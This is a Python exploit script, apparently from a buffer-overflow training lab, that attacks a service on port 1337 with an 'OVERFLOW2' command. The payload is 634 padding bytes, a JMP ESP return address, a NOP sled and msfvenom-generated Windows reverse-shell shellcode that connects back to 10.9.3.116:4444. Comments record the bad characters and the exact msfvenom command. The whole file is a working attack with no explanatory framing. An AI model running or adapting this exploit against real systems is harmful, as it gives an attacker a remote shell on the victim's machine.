import sys
import socket

host = "10.10.208.115"
port = 1337

# bad chars : \x00\x23\x3c\x83\xba
# jmp esp addr : 625011af

# msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.116 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c 

shell = ("\xfc\xbb\x5b\x84\x2c\xdb\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xa7\x6c\xae\xdb\x57"
"\x6d\xcf\x52\xb2\x5c\xcf\x01\xb7\xcf\xff\x42\x95\xe3\x74\x06"
"\x0d\x77\xf8\x8f\x22\x30\xb7\xe9\x0d\xc1\xe4\xca\x0c\x41\xf7"
"\x1e\xee\x78\x38\x53\xef\xbd\x25\x9e\xbd\x16\x21\x0d\x51\x12"
"\x7f\x8e\xda\x68\x91\x96\x3f\x38\x90\xb7\xee\x32\xcb\x17\x11"
"\x96\x67\x1e\x09\xfb\x42\xe8\xa2\xcf\x39\xeb\x62\x1e\xc1\x40"
"\x4b\xae\x30\x98\x8c\x09\xab\xef\xe4\x69\x56\xe8\x33\x13\x8c"
"\x7d\xa7\xb3\x47\x25\x03\x45\x8b\xb0\xc0\x49\x60\xb6\x8e\x4d"
"\x77\x1b\xa5\x6a\xfc\x9a\x69\xfb\x46\xb9\xad\xa7\x1d\xa0\xf4"
"\x0d\xf3\xdd\xe6\xed\xac\x7b\x6d\x03\xb8\xf1\x2c\x4c\x0d\x38"
"\xce\x8c\x19\x4b\xbd\xbe\x86\xe7\x29\xf3\x4f\x2e\xae\xf4\x65"
"\x96\x20\x0b\x86\xe7\x69\xc8\xd2\xb7\x01\xf9\x5a\x5c\xd1\x06"
"\x8f\xf3\x81\xa8\x60\xb4\x71\x09\xd1\x5c\x9b\x86\x0e\x7c\xa4"
"\x4c\x27\x17\x5f\x07\x42\xe1\x5c\xa3\x3a\xf3\x62\x5a\xe7\x7a"
"\x84\x36\x07\x2b\x1f\xaf\xbe\x76\xeb\x4e\x3e\xad\x96\x51\xb4"
"\x42\x67\x1f\x3d\x2e\x7b\xc8\xcd\x65\x21\x5f\xd1\x53\x4d\x03"
"\x40\x38\x8d\x4a\x79\x97\xda\x1b\x4f\xee\x8e\xb1\xf6\x58\xac"
"\x4b\x6e\xa2\x74\x90\x53\x2d\x75\x55\xef\x09\x65\xa3\xf0\x15"
"\xd1\x7b\xa7\xc3\x8f\x3d\x11\xa2\x79\x94\xce\x6c\xed\x61\x3d"
"\xaf\x6b\x6e\x68\x59\x93\xdf\xc5\x1c\xac\xd0\x81\xa8\xd5\x0c"
"\x32\x56\x0c\x95\x52\xb5\x84\xe0\xfa\x60\x4d\x49\x67\x93\xb8"
"\x8e\x9e\x10\x48\x6f\x65\x08\x39\x6a\x21\x8e\xd2\x06\x3a\x7b"
"\xd4\xb5\x3b\xae\xd4\x39\xc4\x51")

buffer = 'OVERFLOW2 ' + 'A' * 634 + '\xaf\x11\x50\x62' + "\x90"*16 + shell + "\x90"*16

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	print(s.recv(1024))
	print("evil payload sending ..!")
	s.send(bytes(buffer, "latin-1"))
	print("[+] Done!")
	s.close()

except:
	print("[-] can not connect!")